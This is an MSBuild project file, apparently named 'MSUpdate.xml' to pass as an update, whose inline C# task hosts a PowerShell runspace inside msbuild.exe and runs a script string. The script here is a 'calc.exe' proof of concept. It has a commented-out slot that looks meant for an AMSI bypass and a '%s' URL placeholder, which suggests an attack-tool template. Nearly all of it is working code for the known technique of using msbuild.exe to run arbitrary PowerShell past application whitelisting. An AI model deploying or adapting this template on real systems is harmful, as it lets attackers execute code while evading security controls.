<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <!-- C:\Windows\Microsoft.NET\Framework64\\v4.0.30319\msbuild.exe MSUpdate.xml -->
  <PropertyGroup>
    <FunctionName Condition="'$(FunctionName)' == ''"></FunctionName>
    <Cmd Condition="'$(Cmd)' == ''">None</Cmd>
    <URL Condition="'$(URL)' == ''">%s</URL>
    </PropertyGroup>
  <Target Name="Run">
   <TaskRun />
  </Target>
    <UsingTask
    TaskName="TaskRun"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
    <Task>
      <Reference Include="System.Management.Automation" />
      <Code Type="Class" Language="cs">
				<![CDATA[

		using System.Runtime.InteropServices;
		using Microsoft.Build.Framework;
		using Microsoft.Build.Utilities;
		using System.Collections.Generic;
		using System.Linq;
		using System.Diagnostics;
		using System.Threading;
    using System;
    using System.Text;
    using System.Management.Automation;
    using System.Management.Automation.Runspaces;

		public class TaskRun :  Task, ITask
		{

			public override bool Execute()
	     {
         Runspace rs = RunspaceFactory.CreateRunspace();
         rs.Open();

         PowerShell ps = PowerShell.Create();
         ps.Runspace = rs;

         //string amis = "";
         string Shell = "calc.exe";

         //ps.AddScript(amis);
         ps.AddScript(Shell);

         ps.Invoke();
         rs.Close();
         return true;
	     }
    }
	      ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
